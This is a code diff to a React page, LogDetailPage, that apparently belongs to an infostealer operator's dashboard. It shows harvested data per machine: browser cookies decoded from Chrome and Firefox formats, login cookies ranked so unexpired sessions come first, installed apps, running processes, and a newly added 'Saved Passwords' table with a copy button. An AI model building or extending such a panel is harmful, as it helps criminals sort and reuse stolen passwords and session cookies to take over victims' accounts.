@@ -541,40 +541,40 @@ const LogDetailPage = () => {
         }
 
         // Helper function to parse expiration date and check if expired
-        const parseExpiration = (expires) => {
+        // Handles different browser formats: Chrome (Windows epoch microseconds), Firefox (Unix timestamp seconds), etc.
+        const parseExpiration = (cookie) => {
+            // Try different expiration field names
+            let expires = cookie.expires || cookie.expires_utc || cookie.expirationDate || cookie.expiry;
+            
             if (!expires || expires === 0) {
                 return { date: null, isExpired: false, dateString: 'Session Cookie' };
             }
+            
             try {
-                // Chrome stores expires_utc in microseconds since Windows epoch (1601-01-01 00:00:00 UTC)
-                // Windows epoch to Unix epoch (1970-01-01 00:00:00 UTC) difference:
-                // The Windows epoch is 11644473600000 milliseconds BEFORE the Unix epoch
-                // So we need to SUBTRACT this difference when converting
-                const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+                let expiresDate: Date;
                 
-                // Convert microseconds to milliseconds, then subtract epoch difference
-                const expiresMs = (expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
-                
-                const expiresDate = new Date(expiresMs);
+                // Check if it's a Unix timestamp (seconds) - Firefox format
+                if (expires < 1000000000000) {
+                    // Unix timestamp in seconds - convert to milliseconds
+                    expiresDate = new Date(expires * 1000);
+                } 
+                // Check if it's a Unix timestamp (milliseconds) - some browsers
+                else if (expires < 1000000000000000) {
+                    // Unix timestamp in milliseconds
+                    expiresDate = new Date(expires);
+                }
+                // Chrome format: Windows epoch in microseconds
+                else {
+                    const WINDOWS_EPOCH_DIFF_MS = 11644473600000;
+                    // Convert microseconds to milliseconds, then subtract epoch difference
+                    const expiresMs = (expires / 1000000) - WINDOWS_EPOCH_DIFF_MS;
+                    expiresDate = new Date(expiresMs);
+                }
                 
                 // Validate the date is reasonable
                 if (isNaN(expiresDate.getTime())) {
-                    console.warn('Invalid expiration date from expires:', expires, 'calculated ms:', expiresMs);
+                    console.warn('Invalid expiration date from expires:', expires);
                     return { date: null, isExpired: false, dateString: `Invalid (${expires})` };
-                }
-                
-                // Debug: Log first few cookies to verify conversion
-                if (Math.random() < 0.05) { // Log 5% of cookies
-                    console.log('Cookie expiration debug:', {
-                        rawExpires: expires,
-                        expiresMicroseconds: expires,
-                        expiresMilliseconds: expires / 1000000,
-                        epochDiff: WINDOWS_EPOCH_DIFF_MS,
-                        calculatedMs: expiresMs,
-                        date: expiresDate.toISOString(),
-                        localString: expiresDate.toLocaleString(),
-                        now: new Date().toISOString()
-                    });
                 }
                 
                 const now = new Date();
@@ -591,17 +591,23 @@ const LogDetailPage = () => {
             }
         };
 
-        // Sort cookies: non-expired first, then expired
+        // Sort cookies: non-expired first, then expired (across all cookies, not just within categories)
         const sortedCookies = [...filteredCookies].map(cookie => ({
             ...cookie,
-            expirationInfo: parseExpiration(cookie.expires)
+            expirationInfo: parseExpiration(cookie)
         })).sort((a, b) => {
-            // Non-expired cookies first
+            // Non-expired cookies first (regardless of login/regular type)
             if (!a.expirationInfo.isExpired && b.expirationInfo.isExpired) return -1;
             if (a.expirationInfo.isExpired && !b.expirationInfo.isExpired) return 1;
-            // If both have same expiration status, sort by expiration date (earliest first)
+            // If both have same expiration status, sort by expiration date (earliest first for non-expired, latest first for expired)
             if (a.expirationInfo.date && b.expirationInfo.date) {
-                return a.expirationInfo.date - b.expirationInfo.date;
+                if (!a.expirationInfo.isExpired) {
+                    // For non-expired: earliest expiration first
+                    return a.expirationInfo.date.getTime() - b.expirationInfo.date.getTime();
+                } else {
+                    // For expired: most recent expiration first
+                    return b.expirationInfo.date.getTime() - a.expirationInfo.date.getTime();
+                }
             }
             return 0;
         });
@@ -641,14 +647,16 @@ const LogDetailPage = () => {
             return nameMatches || domainMatches || (isSessionCookie && isHttpOnly);
         };
 
-        // Separate cookies into login and regular cookies, then by expiration
-        const loginCookies = sortedCookies.filter(c => isLoginCookie(c));
-        const regularCookies = sortedCookies.filter(c => !isLoginCookie(c));
+        // Separate cookies into login and regular cookies
+        // But keep non-expired cookies at the top regardless of type
+        const activeCookies = sortedCookies.filter(c => !c.expirationInfo.isExpired);
+        const expiredCookies = sortedCookies.filter(c => c.expirationInfo.isExpired);
         
-        const activeLoginCookies = loginCookies.filter(c => !c.expirationInfo.isExpired);
-        const expiredLoginCookies = loginCookies.filter(c => c.expirationInfo.isExpired);
-        const activeRegularCookies = regularCookies.filter(c => !c.expirationInfo.isExpired);
-        const expiredRegularCookies = regularCookies.filter(c => c.expirationInfo.isExpired);
+        // Then separate active/expired into login and regular
+        const activeLoginCookies = activeCookies.filter(c => isLoginCookie(c));
+        const activeRegularCookies = activeCookies.filter(c => !isLoginCookie(c));
+        const expiredLoginCookies = expiredCookies.filter(c => isLoginCookie(c));
+        const expiredRegularCookies = expiredCookies.filter(c => !isLoginCookie(c));
 
         const renderCookieTable = (cookieList, title, showTitle = false, isFirstInSection = false, isLastInSection = false) => (
             <>
@@ -766,6 +774,82 @@ const LogDetailPage = () => {
                         {renderCookieTable(expiredRegularCookies, 'Expired Cookies', true, false, true)}
                     </>
                 )}
+            </Box>
+        );
+    };
+
+    const renderSavedPasswords = (passwords) => {
+        if (!passwords || passwords.length === 0) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No saved passwords found.</Typography>;
+        }
+
+        const filteredPasswords = debouncedSearchQuery
+            ? passwords.filter(pwd => {
+                const queryLower = debouncedSearchQuery.toLowerCase();
+                return (pwd.origin && pwd.origin.toLowerCase().includes(queryLower)) ||
+                       (pwd.username && pwd.username.toLowerCase().includes(queryLower)) ||
+                       (pwd.password && pwd.password.toLowerCase().includes(queryLower));
+            })
+            : passwords;
+
+        if (filteredPasswords.length === 0 && debouncedSearchQuery) {
+            return <Typography sx={{ p: 2, color: '#94a3b8' }}>No passwords match your search query.</Typography>;
+        }
+
+        const handleCopyPassword = (password) => {
+            navigator.clipboard.writeText(password).then(() => {
+                console.log('Password copied to clipboard');
+            }).catch(err => {
+                console.error('Failed to copy password:', err);
+            });
+        };
+
+        return (
+            <Box>
+                <TableContainer component={Paper} sx={{ backgroundColor: '#1a1f2e', border: '1px solid #334155' }}>
+                    <Table>
+                        <TableHead>
+                            <TableRow>
+                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Origin/URL</TableCell>
+                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Username</TableCell>
+                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Password</TableCell>
+                                <TableCell sx={{ color: '#4ade80', fontWeight: 600 }}>Actions</TableCell>
+                            </TableRow>
+                        </TableHead>
+                        <TableBody>
+                            {filteredPasswords.map((pwd, index) => (
+                                <TableRow key={index} sx={{ '&:hover': { backgroundColor: 'rgba(255, 255, 255, 0.03)' } }}>
+                                    <TableCell sx={{ color: '#e2e8f0', maxWidth: '300px', wordBreak: 'break-all' }}>
+                                        {pwd.origin || 'N/A'}
+                                    </TableCell>
+                                    <TableCell sx={{ color: '#94a3b8' }}>
+                                        {pwd.username || 'N/A'}
+                                    </TableCell>
+                                    <TableCell sx={{ color: '#f59e0b', fontFamily: 'monospace' }}>
+                                        {pwd.password ? '•'.repeat(Math.min(pwd.password.length, 20)) : 'N/A'}
+                                    </TableCell>
+                                    <TableCell>
+                                        <Button
+                                            size="small"
+                                            onClick={() => handleCopyPassword(pwd.password || '')}
+                                            sx={{
+                                                color: '#4ade80',
+                                                borderColor: '#4ade80',
+                                                '&:hover': {
+                                                    borderColor: '#22c55e',
+                                                    backgroundColor: 'rgba(74, 222, 128, 0.1)',
+                                                }
+                                            }}
+                                            variant="outlined"
+                                        >
+                                            Copy Password
+                                        </Button>
+                                    </TableCell>
+                                </TableRow>
+                            ))}
+                        </TableBody>
+                    </Table>
+                </TableContainer>
             </Box>
         );
     };
@@ -1299,6 +1383,11 @@ const LogDetailPage = () => {
                 })()})`} 
                 data={pcData.browserCookies} 
                 renderFunction={renderCookiesTable} 
+            />
+            <DataSection 
+                title={`Saved Passwords (${pcData.savedPasswords?.length || 0})`} 
+                data={pcData.savedPasswords} 
+                renderFunction={renderSavedPasswords} 
             />
             <DataSection title={`Installed Apps (${pcData.installedApps?.length || 0})`} data={pcData.installedApps} renderFunction={renderSimpleTable} />
             <DataSection title={`Running Processes (${pcData.runningProcesses?.length || 0})`} data={pcData.runningProcesses} renderFunction={renderProcessesTable} />
